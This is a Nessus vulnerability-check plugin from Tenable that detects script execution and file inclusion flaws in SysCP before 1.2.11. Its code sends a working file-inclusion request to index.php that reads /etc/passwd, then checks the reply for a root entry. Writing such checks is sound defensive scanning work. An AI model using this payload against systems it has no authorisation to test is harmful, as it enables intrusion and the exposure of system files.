#
# (C) Tenable Network Security
#


if (description) {
  script_id(19417);
  script_version("$Revision: 1.4 $");

  script_bugtraq_id(14490);

  name["english"] = "SysCP < 1.2.11 Multiple Script Execution Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is affected by remote
code execution vulnerabilities. 

Description :

The remote host is running SysCP, an open-source control panel written
in PHP. 

The version of SysCP installed on the remote host uses user-supplied
input to several variables in various scripts without sanitizing it. 
Provided PHP's 'register_globals' setting is enabled, an attacker can
exploit these flaws to pass arbitrary PHP code to the application's
internal template engine for execution or to affect the application's
use of include files. 

See also : 

http://www.hardened-php.net/advisory_132005.64.html

Solution : 

Upgrade to SysCP version 1.2.11 or later.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple script execution vulnerabilities in SysCP < 1.2.11";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the file include flaw.
  req = http_get(
    item:string(
      dir, "/index.php?",
      "action=login&",
      "languages[Nessus]=", SCRIPT_NAME, "&",
      "language=Nessus&",
      "langs[Nessus][0][file]=/etc/passwd"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we get the password file.
  if (egrep(string:res, pattern:"root:.*:0:[01]:")) {
    security_hole(port);
    exit(0);
  }
}
